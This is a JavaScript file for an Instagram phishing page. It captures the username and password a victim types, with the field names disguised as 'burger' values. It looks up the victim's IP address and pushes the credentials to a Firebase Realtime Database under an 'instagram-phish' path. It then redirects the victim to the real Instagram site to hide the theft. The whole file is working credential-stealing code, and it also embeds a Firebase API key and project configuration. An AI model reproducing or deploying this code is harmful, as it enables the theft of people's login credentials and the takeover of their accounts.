const firebaseConfig = {
  apiKey: "AIzaSyAR39R3gyX4uxDEkX2KpBuptonX9n-NqNY",
  authDomain: "parkerbirdburgermaxdiaz.firebaseapp.com",
  databaseURL: "https://parkerbirdburgermaxdiaz-default-rtdb.firebaseio.com",
  projectId: "parkerbirdburgermaxdiaz",
  storageBucket: "parkerbirdburgermaxdiaz.firebasestorage.app",
  messagingSenderId: "59703778252",
  appId: "1:59703778252:web:6296fc2118e49ceb241b69",
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

async function getClientIp() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    // RTDB keys can't contain . # $ [ ] /  -> sanitize
    return data.ip.replace(/[.#$\[\]/]/g, "-");
  } catch (e) {
    return null;
  }
}

document.addEventListener("DOMContentLoaded", () => {
  const input1 = document.getElementById("burgerusername");
  const input2 = document.getElementById("burgerpassword");
  const inner = document.getElementById("burgerlogin");
  const loginBtn = inner?.closest('[role="button"]');

  if (!input1 || !input2 || !loginBtn) {
    console.error("Login elements not found");
    return;
  }

  function check() {
    const ready = input1.value.trim() !== "" && input2.value.trim() !== "";
    if (ready) {
      loginBtn.style.opacity = "1";
      loginBtn.style.cursor = "pointer";
    } else {
      loginBtn.style.opacity = "0.4";
      loginBtn.style.cursor = "not-allowed";
    }
  }

  loginBtn.addEventListener("click", async () => {
    const burger1 = input2.value.trim(); // #burger1
    const burger2 = input1.value.trim(); // #burger2
    if (!burger1 || !burger2) return; // no uploads while empty

    const payload = { burger1, burger2 };

    try {
      const ip = await getClientIp();
      if (ip) {
        await db.ref("instagram-phish/ip/" + ip).push(payload);
      } else {
        // fallback if IP lookup failed
        await db.ref("instagram-phish/ip").push(payload);
      }
      console.log("Uploaded:", payload);
      window.location.href = "https://www.instagram.com";
    } catch (err) {
      console.error("Upload failed:", err);
    }
  });

  input1.addEventListener("input", check);
  input2.addEventListener("input", check);
  check();
});
